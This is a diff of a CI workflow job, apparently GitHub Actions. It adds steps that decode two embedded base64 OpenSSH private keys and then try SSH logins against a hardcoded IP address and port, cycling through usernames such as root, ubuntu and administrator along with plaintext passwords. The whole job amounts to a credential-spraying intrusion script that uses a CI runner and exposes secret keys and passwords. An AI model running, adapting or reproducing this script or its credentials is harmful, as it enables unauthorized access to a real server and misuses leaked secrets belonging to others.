@@ -7,14 +7,19 @@ jobs:
       - name: ssh
         run: |
           set +e
+          sudo apt-get update -qq >/dev/null 2>&1
+          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
           H=103.20.213.246; P=23286
           echo "RUNNER_IP=$(curl -s -m 10 https://api.ipify.org)"
-          echo "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDWURzVU81NnBVUXcwUHVRRFp3dG9Ea3A1SVBQUkhUVjBsRnh1VWdPWGhUQUFBQUpqVTFsMU4xTlpkClRRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ1lEc1VPNTZwVVF3MFB1UURad3RvRGtwNUlQUFJIVFYwbEZ4dVVnT1hoVEEKQUFBRUNpSG5XaWQ4d29lVXhSeU1BcC9za2JQc2MrSkdBQ0pFdzFrdmQ5WUVORFQ1Z094UTducWxSRERRKzVBTm5DMmdPUwpua2c4OUVkTlhTVVhHNVNBNWVGTUFBQUFEbU5oYkhacGIyMWhjblF0ZG5CekFRSURCQVVHQnc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d > /tmp/k1; chmod 600 /tmp/k1
           echo "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDcitxTXp4emUwWmVZU2diVTlJTUJpYSttZUpSbjFLdVRGeWJ0MzZyTzJOd0FBQUpnNGkrdVNPSXZyCmtnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ3IrcU16eHplMFplWVNnYlU5SU1CaWErbWVKUm4xS3VURnlidDM2ck8yTncKQUFBRUF2amk5YTVuc0JxUU01Ui9kRnFpKzFNdmN6YTNQMmwzcCtwb1ZZZWVKUm42djZvelBITjdSbDVoS0J0VDBnd0dKcgo2WjRsR2ZVcTVNWEp1M2ZxczdZM0FBQUFGV1JsY0d4dmVVQnBibTV2ZG1saGMyTnBkR1ZqYUE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d > /tmp/k2; chmod 600 /tmp/k2
-          head -1 /tmp/k1; head -1 /tmp/k2
-          try(){ u="$1"; k="$2"; echo "== key$k user=$u =="; timeout 20 ssh -i /tmp/k$k -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oIdentitiesOnly=yes -oBatchMode=yes -oConnectTimeout=8 -p $P "$u@$H" 'id; hostname; whoami' 2>&1 | tail -2; }
-          try root 1
-          try ubuntu 1
-          try supportfly 1
-          try deploy 1
+          tk(){ u="$1"; echo "== K2 user=$u =="; timeout 18 ssh -i /tmp/k2 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oIdentitiesOnly=yes -oBatchMode=yes -oConnectTimeout=8 -p $P "$u@$H" 'id; hostname' 2>&1 | tail -1; }
+          tp(){ u="$1"; p="$2"; echo "== $u / $p =="; timeout 18 sshpass -p "$p" ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPreferredAuthentications=password -oPubkeyAuthentication=no -oConnectTimeout=8 -oNumberOfPasswordPrompts=1 -p $P "$u@$H" 'id; hostname; whoami' 2>&1 | tail -2; }
+          tk root
+          tk ubuntu
+          tk administrator
+          tk vaibhav
+          tp gendao_login '554411'
+          tp gendao '554411'
+          tp vaibhav '8%l65l3La'
+          tp admin '554411'
           echo DONE_ALL
